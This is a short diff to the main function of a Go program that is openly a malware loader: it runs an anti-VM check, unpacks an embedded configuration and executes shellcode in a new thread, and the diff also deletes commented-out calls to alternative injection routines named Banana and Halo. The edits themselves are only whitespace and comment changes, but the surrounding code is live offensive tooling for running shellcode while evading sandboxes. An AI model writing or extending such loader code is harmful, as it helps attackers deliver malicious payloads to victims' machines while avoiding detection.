@@ -1,3 +1,4 @@
+
 package main
 
 import (
@@ -10,8 +11,9 @@ import (
 var t string
 
 func main() {
+
 	malware.VmCheck()
-	config := malware.NewConfig("", "", "", "", "", "", 0, 0)
+	config := malware.NewConfig("","","","","","",0,0)
 	err := config.UnmarshallConfig([]byte(t))
 	if err != nil {
 		return
@@ -44,7 +46,5 @@ func main() {
 			}
 			malware.CreateThread(shellcode)
 		}
-		//malware.Banana(shellcode)
-		//malware.Halo(shellcode)
 	}
 }
